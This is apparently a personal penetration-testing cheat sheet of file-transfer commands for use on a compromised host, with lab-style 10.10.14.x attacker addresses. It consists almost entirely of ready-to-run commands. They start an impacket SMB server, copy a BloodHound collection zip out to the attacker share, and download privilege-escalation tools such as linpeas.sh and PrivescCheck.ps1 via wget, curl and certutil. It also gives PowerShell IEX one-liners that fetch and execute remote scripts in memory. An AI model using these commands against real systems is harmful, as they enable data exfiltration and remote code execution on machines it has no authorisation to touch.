# SMB Server

## Start the SMB Server

```sh
sudo impacket-smbserver share . -smb2support
```

```sh
impacket-smbserver share . -smb2support -username burak -password burak123
```

## Upload Files to SMB Share

```powershell
net use \\172.16.7.240\share /user:burak burak123
```

```powershell
copy "C:\Users\Public\20260727055253_BloodHound.zip" \\172.16.7.240\share\
```

```powershell
copy \\10.10.14.5\share\file.exe C:\Windows\Temp\
```

```cmd
net use \\10.10.14.5\share

copy \\10.10.14.5\share\file.exe .
```
# Python HTTP Server

```sh
python3 -m http.server 8000
```

# Download from Linux

```sh
wget http://10.10.14.57:8000/linpeas.sh -o linpeas.sh
```

```sh
curl -O http://10.10.14.57:8000/linpeas.sh
```

# Download from Windows

```sh
iwr http://10.10.14.57:8000/PrivescCheck.ps1 -O .
```

```sh
wget http://10.10.14.57:8000/PrivescCheck.ps1 -OutFile PrivescCheck.ps1
```

```sh
curl http://10.10.14.5:8000/file.exe -o file.exe
```

```sh
certutil -urlcache -split -f http://10.10.14.5:8000/file.exe file.exe
```

# Download and Execute Scripts with PowerShell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/script.ps1')
```

```powershell
IEX (iwr http://10.10.14.5:8000/script.ps1).Content
```

# smbclient File Upload

```sh
smbclient //server/share -U user%pass -c 'put local.txt remote.txt'
```